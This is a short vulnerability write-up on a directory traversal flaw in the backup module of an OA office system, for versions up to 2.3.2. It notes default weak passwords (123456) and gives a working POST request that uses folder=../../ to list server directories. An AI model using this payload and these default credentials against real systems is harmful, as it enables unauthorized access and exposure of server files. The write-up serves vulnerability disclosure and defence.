# Xinku OA beifenAction.php background directory traversal vulnerability

## Vulnerability Description

The getfilerows method is called in the OA beifenAction.php file, resulting in a directory traversal vulnerability. The attacker can obtain file information on the server through the vulnerability.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Call OA <= 2.3.2</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1637826393127-40e04bac-5443-4dd6-b5d4-b2e8e7e63606.png)

Among them, there are several users with weak passwords by default 123456

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1637826384345-ad90b308-7431-4a96-9baa-6808129967ea.png)

The vulnerable file is `webmain/system/beifen/beifenAction.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1637826483632-dc07740e-e0e5-4b6e-8ce3-e24ad1398db9.png)

View the `getfilerows()` method in `include/chajian/fileChajian.php`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1637826756244-21762aa4-adbe-453a-86e3-452e767df30e.png)

This method traverses the file name in the directory and outputs it. After logging in, sends the request packet

```python
POST /index.php?a=getdatssss&m=beifen&d=system&ajaxbool=true

folder=../../
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1637826832637-432df24d-758c-41c0-885e-ba6f79354ce4.png)